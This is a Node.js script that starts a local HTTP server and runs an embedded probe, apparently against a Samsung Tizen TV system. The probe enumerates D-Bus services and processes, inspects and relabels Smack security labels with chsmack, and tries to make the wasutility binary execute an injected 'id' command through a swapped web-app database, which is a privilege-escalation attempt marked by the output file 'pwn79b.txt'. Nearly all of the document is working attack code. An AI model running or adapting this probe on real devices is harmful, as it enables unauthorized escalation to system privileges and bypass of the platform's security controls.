'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8168;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe79hb.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. D-Bus: list all system bus service names
  'try {',
  '  var o = cp.spawnSync("gdbus", ["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.ListNames"], {timeout:8000});',
  '  r.dbus_sys_names = (o.stdout||Buffer.from("")).toString().trim().slice(0,3000);',
  '} catch(e) { r.dbus_sys_err = e.message.slice(0,100); }',

  // 2. Find RunningAppsService process via ps
  'try {',
  '  var o2 = cp.spawnSync("/bin/ps", ["aux"], {timeout:5000});',
  '  var psout = (o2.stdout||Buffer.from("")).toString();',
  '  r.user_procs = psout.split("\\n").filter(function(l){',
  '    return l.indexOf("[") === -1 && l.trim().length > 0;',
  '  }).slice(0,50).join("\\n").slice(0,3000);',
  '} catch(e) { r.ps_err = e.message; }',

  // 3. Try introspect RunningAppsService via system bus
  'var rasNames = ["org.tizen.RunningAppsService","com.samsung.RunningAppsService","org.tizen.tv.RunningAppsService","com.samsung.tv.runningapps"];',
  'r.ras_dbus = {};',
  'rasNames.forEach(function(name) {',
  '  try {',
  '    var o3 = cp.spawnSync("gdbus", ["introspect","--system","--dest",name,"--object-path","/com/native/RunningAppsServiceDBUS"], {timeout:4000});',
  '    var out = (o3.stdout||Buffer.from("")).toString().trim().slice(0,500);',
  '    r.ras_dbus[name] = out || (o3.stderr||Buffer.from("")).toString().trim().slice(0,100);',
  '  } catch(e) { r.ras_dbus[name] = e.message.slice(0,60); }',
  '});',

  // 4. Check Smack label on wasdb via getfattr
  'try {',
  '  var o4 = cp.spawnSync("/bin/sh", ["-c", "getfattr --only-values -n security.SMACK64 /opt/dbspace/.webappservice.db 2>&1; echo --; ls -Z /opt/dbspace/.webappservice.db 2>&1"], {timeout:3000});',
  '  r.wasdb_smack = (o4.stdout||Buffer.from("")).toString().trim().slice(0,200);',
  '} catch(e) { r.wasdb_smack_err = e.message; }',

  // 5. Read wasdb copy schema
  'try {',
  '  var o5 = cp.spawnSync("sqlite3", ["/tmp/wasdb_copy.db", ".tables"], {timeout:5000});',
  '  r.wasdb_tables = (o5.stdout||Buffer.from("")).toString().trim();',
  '} catch(e) { r.wasdb_tables_err = e.message; }',

  // 6. Try chsmack on our copy
  'try {',
  '  var o6 = cp.spawnSync("/bin/chsmack", ["-a", "System", "/tmp/wasdb_copy.db"], {timeout:3000});',
  '  r.chsmack = { status: o6.status, out: ((o6.stdout||Buffer.from("")).toString()+(o6.stderr||Buffer.from("")).toString()).trim().slice(0,100) };',
  '} catch(e) { r.chsmack_err = e.message; }',

  // 7. After chsmack, try wasutility with our copy
  'try {',
  '  var env1 = {};',
  '  Object.keys(process.env).forEach(function(k){ env1[k] = process.env[k]; });',
  '  env1.WAS_UTILITY = "/tmp/wasdb_copy.db";',
  '  var o7 = cp.spawnSync("/usr/bin/wasutility", ["-e", "id > /tmp/pwn79b.txt"], { timeout:5000, env:env1 });',
  '  r.was_copy_db = { status: o7.status, out: ((o7.stdout||Buffer.from("")).toString()+(o7.stderr||Buffer.from("")).toString()).trim().slice(0,200) };',
  '  try { r.pwn = fs.readFileSync("/tmp/pwn79b.txt","utf8").trim(); } catch(e) { r.pwn_err = e.code; }',
  '} catch(e) { r.was_copy_err = e.message.slice(0,100); }',

  // 8. Check if RunningAppsService binary is suid and try calling it
  'try {',
  '  var o8 = cp.spawnSync("/usr/bin/RunningAppsService", [], {timeout:5000});',
  '  r.ras_noarg = { status: o8.status, out: ((o8.stdout||Buffer.from("")).toString()+(o8.stderr||Buffer.from("")).toString()).trim().slice(0,300) };',
  '} catch(e) { r.ras_err = e.message.slice(0,100); }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
